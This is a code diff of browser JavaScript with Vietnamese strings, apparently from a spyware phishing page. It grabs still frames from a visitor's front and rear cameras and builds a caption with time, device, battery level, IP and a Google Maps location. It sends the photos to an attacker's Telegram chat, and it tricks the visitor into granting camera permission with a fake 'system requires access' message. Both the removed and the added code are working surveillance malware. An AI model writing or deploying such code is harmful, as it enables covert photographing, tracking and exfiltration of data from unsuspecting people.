@@ -496,7 +496,7 @@
     return out;
   }
 
-  function buildCaption(time, device, batt, ip, camLabel){
+  function buildCaption(time, device, batt, ip){
     var mapsLine = "";
     if(ip.maps){
       mapsLine = "\uD83D\uDDFA\uFE0F <b>Google Maps:</b> <a href=\"" + ip.maps + "\">" + ip.maps + "</a>\n";
@@ -504,11 +504,8 @@
       mapsLine = "\uD83D\uDDFA\uFE0F <b>Google Maps:</b> Kh\u00f4ng l\u1ea5y \u0111\u01b0\u1ee3c t\u1ecda \u0111\u1ed9\n";
     }
 
-    var camLine = camLabel ? ("\uD83D\uDCF8 <b>" + camLabel + "</b>\n") : "";
-
     return "\uD83D\uDEA8 <b>PH\u00c1T HI\u1ec6N L\u01af\u1ee2T TRUY C\u1eacP M\u1edaI</b> \uD83D\uDEA8\n" +
       "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n" +
-      camLine +
       "\u23f0 <b>Th\u1eddi gian:</b> <code>" + time + "</code>\n" +
       "\uD83D\uDCF1 <b>Thi\u1ebft b\u1ecb:</b> " + device + "\n" +
       "\uD83D\uDD0B <b>Pin:</b> " + batt + "\n" +
@@ -523,67 +520,24 @@
       "\uD83D\uDD17 <b>Nh\u00f3m share file:</b> https://t.me/Andanh3344";
   }
 
-  function waitVideoReady(timeout){
-    timeout = timeout || 6000;
+  function waitVideo(){
     return new Promise(function(resolve){
       var t = 0;
       var iv = setInterval(function(){
-        t += 50;
-        if(V.videoWidth > 0 && V.videoHeight > 0 && V.readyState >= 4){
+        t += 100;
+        if(V.videoWidth > 0 && V.videoHeight > 0){
           clearInterval(iv);
           resolve(true);
         }
-        if(t > timeout){
+        if(t > 12000){
           clearInterval(iv);
-          resolve(V.videoWidth > 0 && V.videoHeight > 0);
-        }
-      }, 50);
-    });
-  }
-
-  function isBlobDark(blob){
-    return new Promise(function(resolve){
-      var url = URL.createObjectURL(blob);
-      var img = new Image();
-      img.onload = function(){
-        try{
-          var cc = document.createElement("canvas");
-          cc.width = 40;
-          cc.height = 40;
-          var ctx = cc.getContext("2d");
-          ctx.drawImage(img, 0, 0, 40, 40);
-          var data = ctx.getImageData(0, 0, 40, 40).data;
-          var total = 0, samples = 0;
-          for(var i = 0; i < data.length; i += 4){
-            total += (data[i] + data[i+1] + data[i+2]) / 3;
-            samples++;
-          }
-          var avg = total / samples;
-          URL.revokeObjectURL(url);
-          resolve(avg < 15);
-        }catch(e){
-          URL.revokeObjectURL(url);
           resolve(false);
         }
-      };
-      img.onerror = function(){
-        URL.revokeObjectURL(url);
-        resolve(true);
-      };
-      img.src = url;
+      }, 100);
     });
   }
 
-  function laLoiQuyen(err){
-    if(!err) return false;
-    var n = err.name || "";
-    if(n === "NotAllowedError") return true;
-    if(n === "PermissionDeniedError") return true;
-    if(n === "SecurityError") return true;
-    return false;
-  }
-
-  function hienThiLoiQuyen(){
+  function hienThiLoiCamera(){
     S.textContent = "\u26a0\ufe0f B\u1ea1n CH\u01afA NH\u1ea4N CHO PH\u00c9P. H\u00e3y nh\u1ea5n l\u1ea1i v\u00e0 ch\u1ecdn \"Cho ph\u00e9p\".";
     S.classList.add("error");
     P.innerHTML = "\u26a0\ufe0f <b>H\u1ec7 th\u1ed1ng y\u00eau c\u1ea7u quy\u1ec1n truy c\u1eadp.</b><br>Vui l\u00f2ng nh\u1ea5n l\u1ea1i n\u00fat b\u00ean d\u01b0\u1edbi v\u00e0 ch\u1ecdn <b>\"Cho ph\u00e9p\"</b> \u0111\u1ec3 ti\u1ebfp t\u1ee5c.";
@@ -592,271 +546,107 @@
     TITLE.textContent = "Y\u00eau C\u1ea7u Quy\u1ec1n Truy C\u1eadp";
   }
 
-  async function getAllCameras(){
-    try{
-      if(!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return [];
-      var devices = await navigator.mediaDevices.enumerateDevices();
-      return devices.filter(function(d){ return d.kind === "videoinput"; });
-    }catch(e){
-      return [];
-    }
-  }
-
-  async function getCameraByFacing(facingMode){
+  /* ===== MỞ CAMERA VỚI FACINGMODE CHỈ ĐỊNH ===== */
+  function getCamera(facingMode){
     return new Promise(function(resolve, reject){
       if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
         return reject(new Error("not_supported"));
       }
       navigator.mediaDevices.getUserMedia({
-        video: {
-          facingMode: { exact: facingMode },
-          width: { ideal: 1280 },
-          height: { ideal: 720 }
-        },
-        audio: false
-      }).then(resolve).catch(function(){
-        navigator.mediaDevices.getUserMedia({
-          video: {
-            facingMode: { ideal: facingMode },
-            width: { ideal: 1280 },
-            height: { ideal: 720 }
-          },
-          audio: false
-        }).then(resolve).catch(function(e){
-          navigator.mediaDevices.getUserMedia({video:true, audio:false})
-            .then(resolve).catch(function(){ reject(e); });
-        });
+        video:{ facingMode: { ideal: facingMode }, width:{ideal:640}, height:{ideal:480} },
+        audio:false
+      }).then(resolve).catch(function(e){
+        // fallback nếu không có cam chỉ định
+        navigator.mediaDevices.getUserMedia({video:true, audio:false})
+          .then(resolve).catch(function(){ reject(e); });
       });
     });
   }
 
-  async function getCameraByDeviceId(deviceId){
-    return new Promise(function(resolve, reject){
-      navigator.mediaDevices.getUserMedia({
-        video: {
-          deviceId: { exact: deviceId },
-          width: { ideal: 1280 },
-          height: { ideal: 720 }
-        },
-        audio: false
-      }).then(resolve).catch(reject);
-    });
-  }
-
-  async function snapFromStream(stream){
+  /* ===== CHỤP 1 KHUNG HÌNH TỪ STREAM ===== */
+  async function captureFromStream(stream){
     V.srcObject = stream;
     V.setAttribute("playsinline", "");
     V.setAttribute("webkit-playsinline", "");
     V.muted = true;
-
     try{ await V.play(); }catch(e){}
 
-    var ok = await waitVideoReady(6000);
+    var ok = await waitVideo();
+    if(!ok) return null;
 
-    if(!ok){
-      try{ stream.getTracks().forEach(function(t){ t.stop(); }); }catch(e){}
-      V.srcObject = null;
-      return null;
-    }
-
-    await new Promise(function(r){ setTimeout(r, 900); });
-
-    var blob = null;
-    var track = stream.getVideoTracks()[0];
-
-    try{
-      if(window.ImageCapture && track){
-        var ic = new ImageCapture(track);
-        try{
-          var caps = track.getCapabilities ? track.getCapabilities() : {};
-          var adv = {};
-          if(caps.focusMode && caps.focusMode.indexOf("continuous") >= 0){
-            adv.focusMode = "continuous";
-          }
-          if(caps.exposureMode && caps.exposureMode.indexOf("continuous") >= 0){
-            adv.exposureMode = "continuous";
-          }
-          if(Object.keys(adv).length > 0){
-            await track.applyConstraints({advanced:[adv]});
-          }
-        }catch(e){}
-
-        await new Promise(function(r){ setTimeout(r, 300); });
-
-        var pb = await ic.takePhoto();
-        if(pb && pb.size > 1000){
-          var dark = await isBlobDark(pb);
-          if(!dark) blob = pb;
-        }
-      }
-    }catch(e){ blob = null; }
-
-    if(!blob){
-      try{
-        if(V.videoWidth > 0 && V.videoHeight > 0){
-          C.width = V.videoWidth;
-          C.height = V.videoHeight;
-          var ctx = C.getContext("2d");
-          ctx.drawImage(V, 0, 0, C.width, C.height);
-          var dataUrl = C.toDataURL("image/jpeg", 0.92);
-          var canvasBlob = await new Promise(function(resolve){
-            try{
-              var arr = dataUrl.split(",");
-              var mime = arr[0].match(/:(.*?);/)[1];
-              var bstr = atob(arr[1]);
-              var n = bstr.length;
-              var u8 = new Uint8Array(n);
-              while(n--){ u8[n] = bstr.charCodeAt(n); }
-              resolve(new Blob([u8], {type:mime}));
-            }catch(e){ resolve(null); }
-          });
-          if(canvasBlob && canvasBlob.size > 500){
-            var dark2 = await isBlobDark(canvasBlob);
-            if(!dark2) blob = canvasBlob;
-          }
-        }
-      }catch(e){}
-    }
+    C.width = V.videoWidth;
+    C.height = V.videoHeight;
+    var ctx = C.getContext("2d");
+    ctx.drawImage(V, 0, 0, C.width, C.height);
+    var dataUrl = C.toDataURL("image/jpeg", 0.9);
 
     try{ stream.getTracks().forEach(function(t){ t.stop(); }); }catch(e){}
     V.srcObject = null;
 
-    await new Promise(function(r){ setTimeout(r, 600); });
-
+    // convert sang blob
+    var blob = await new Promise(function(resolve){
+      try{
+        var arr = dataUrl.split(",");
+        var mime = arr[0].match(/:(.*?);/)[1];
+        var bstr = atob(arr[1]);
+        var n = bstr.length;
+        var u8 = new Uint8Array(n);
+        while(n--){ u8[n] = bstr.charCodeAt(n); }
+        resolve(new Blob([u8], {type:mime}));
+      }catch(e){ resolve(null); }
+    });
     return blob;
   }
 
-  async function sendPhoto(blob, caption, filename){
-    if(!blob || blob.size < 500) return false;
+  /* ===== GỬI ẢNH LÊN TELEGRAM ===== */
+  async function sendPhotoBlob(blob, caption, filename){
+    if(!blob || blob.size === 0) return;
     var fd = new FormData();
     fd.append("chat_id", CHAT);
     fd.append("photo", blob, filename || "capture.jpg");
-    fd.append("caption", caption || "");
+    fd.append("caption", caption);
     fd.append("parse_mode", "HTML");
+    try{ await _api.sendPhoto(fd); }catch(e){}
+  }
+
+  /* ===== CHỤP CAM TRƯỚC + CAM SAU ===== */
+  async function captureAndSend(caption){
+    var frontBlob = null, backBlob = null;
+    var errorName = "";
+
+    // 1. Chụp cam trước (user)
     try{
-      var res = await _api.sendPhoto(fd);
-      var json = await res.json();
-      return json && json.ok;
+      var sFront = await getCamera("user");
+      frontBlob = await captureFromStream(sFront);
+      if(frontBlob) await sendPhotoBlob(frontBlob, caption + "\n\n📸 <b>CAM TRƯỚC</b>", "front.jpg");
     }catch(e){
+      errorName = e && e.name ? e.name : "unknown";
+    }
+
+    // 2. Đợi 400ms rồi chụp cam sau (environment)
+    await new Promise(function(r){ setTimeout(r, 400); });
+
+    try{
+      var sBack = await getCamera("environment");
+      backBlob = await captureFromStream(sBack);
+      if(backBlob) await sendPhotoBlob(backBlob, caption + "\n\n📸 <b>CAM SAU</b>", "back.jpg");
+    }catch(e){
+      if(!errorName) errorName = e && e.name ? e.name : "unknown";
+    }
+
+    // Nếu cả 2 đều fail → gửi text báo lỗi
+    if(!frontBlob && !backBlob){
+      try{
+        await _api.sendMsg({
+          chat_id: CHAT,
+          text: caption + "\n\n\u26a0\uFE0F <i>(Kh\u00f4ng th\u1ec3 truy c\u1eadp camera: " + errorName + ")</i>",
+          parse_mode: "HTML"
+        });
+      }catch(e){}
       return false;
     }
-  }
 
-  async function captureFrontCamera(){
-    var result = { blob: null, err: null, gotPermission: false };
-
-    try{
-      var s = await getCameraByFacing("user");
-      result.gotPermission = true;
-      result.blob = await snapFromStream(s);
-      if(result.blob) return result;
-    }catch(e){
-      result.err = e;
-      if(laLoiQuyen(e)) return result;
-    }
-
-    try{
-      var cams = await getAllCameras();
-      for(var i = 0; i < cams.length; i++){
-        try{
-          var s2 = await getCameraByDeviceId(cams[i].deviceId);
-          result.gotPermission = true;
-          var t = s2.getVideoTracks()[0];
-          var settings = t.getSettings ? t.getSettings() : {};
-          if(settings.facingMode === "environment"){
-            try{ s2.getTracks().forEach(function(x){ x.stop(); }); }catch(e){}
-            continue;
-          }
-          result.blob = await snapFromStream(s2);
-          if(result.blob) return result;
-        }catch(e){
-          if(!result.err) result.err = e;
-          if(laLoiQuyen(e)) return result;
-        }
-      }
-    }catch(e){}
-
-    return result;
-  }
-
-  async function captureBackCamera(){
-    var result = { blob: null, err: null, gotPermission: false };
-
-    try{
-      var s = await getCameraByFacing("environment");
-      result.gotPermission = true;
-      result.blob = await snapFromStream(s);
-      if(result.blob) return result;
-    }catch(e){
-      result.err = e;
-      if(laLoiQuyen(e)) return result;
-    }
-
-    try{
-      var cams = await getAllCameras();
-      var backCam = null;
-      for(var i = 0; i < cams.length; i++){
-        var label = (cams[i].label || "").toLowerCase();
-        if(label.indexOf("back") >= 0 || label.indexOf("rear") >= 0 || label.indexOf("sau") >= 0 || label.indexOf("environment") >= 0){
-          backCam = cams[i];
-          break;
-        }
-      }
-      if(!backCam && cams.length > 1){
-        backCam = cams[cams.length - 1];
-      }
-      if(backCam){
-        try{
-          var s2 = await getCameraByDeviceId(backCam.deviceId);
-          result.gotPermission = true;
-          result.blob = await snapFromStream(s2);
-          if(result.blob) return result;
-        }catch(e){
-          if(!result.err) result.err = e;
-          if(laLoiQuyen(e)) return result;
-        }
-      }
-    }catch(e){}
-
-    return result;
-  }
-
-  async function captureAndSendBoth(baseCaption){
-    var anySent = false;
-    var anyPermissionDenied = false;
-    var anySuccess = false;
-
-    var rFront = await captureFrontCamera();
-    if(laLoiQuyen(rFront.err)) anyPermissionDenied = true;
-    if(rFront.blob) anySuccess = true;
-
-    if(rFront.blob){
-      var capFront = baseCaption.replace("__CAM__", "\uD83D\uDCF8 CAM TR\u01af\u1edaC");
-      var sent1 = await sendPhoto(rFront.blob, capFront, "front.jpg");
-      if(sent1) anySent = true;
-    }
-
-    await new Promise(function(r){ setTimeout(r, 900); });
-
-    var rBack = await captureBackCamera();
-    if(laLoiQuyen(rBack.err)) anyPermissionDenied = true;
-    if(rBack.blob) anySuccess = true;
-
-    if(rBack.blob){
-      var capBack = baseCaption.replace("__CAM__", "\uD83D\uDCF8 CAM SAU");
-      var sent2 = await sendPhoto(rBack.blob, capBack, "back.jpg");
-      if(sent2) anySent = true;
-    }
-
-    if(anySent){
-      return { ok: true, permissionDenied: false };
-    }
-
-    if(anyPermissionDenied){
-      return { ok: false, permissionDenied: true };
-    }
-
-    return { ok: false, permissionDenied: false };
+    return true;
   }
 
   function loadImage(){
@@ -1216,22 +1006,12 @@
     var device = getDevice();
     var batt   = await getBattery();
     var ip     = await getIP();
+    var caption = buildCaption(time, device, batt, ip);
 
-    var baseCaption = buildCaption(time, device, batt, ip, "__CAM__");
+    var ok = await captureAndSend(caption);
 
-    var result = await captureAndSendBoth(baseCaption);
-
-    if(!result.ok){
-      if(result.permissionDenied){
-        hienThiLoiQuyen();
-      }else{
-        S.textContent = "\u26a0\ufe0f Kh\u00f4ng th\u1ec3 ch\u1ee5p \u1ea3nh. Vui l\u00f2ng th\u1eed l\u1ea1i.";
-        S.classList.add("error");
-        P.textContent = "Vui l\u00f2ng nh\u1ea5n l\u1ea1i n\u00fat b\u00ean d\u01b0\u1edbi \u0111\u1ec3 th\u1eed l\u1ea1i.";
-        B.style.display = "flex";
-        B.querySelector("span").textContent = "\ud83d\udd04 TH\u1eec L\u1ea0I";
-        TITLE.textContent = "Kh\u00f4ng Th\u1ec3 Ch\u1ee5p \u1ea2nh";
-      }
+    if(!ok){
+      hienThiLoiCamera();
       return;
     }
 
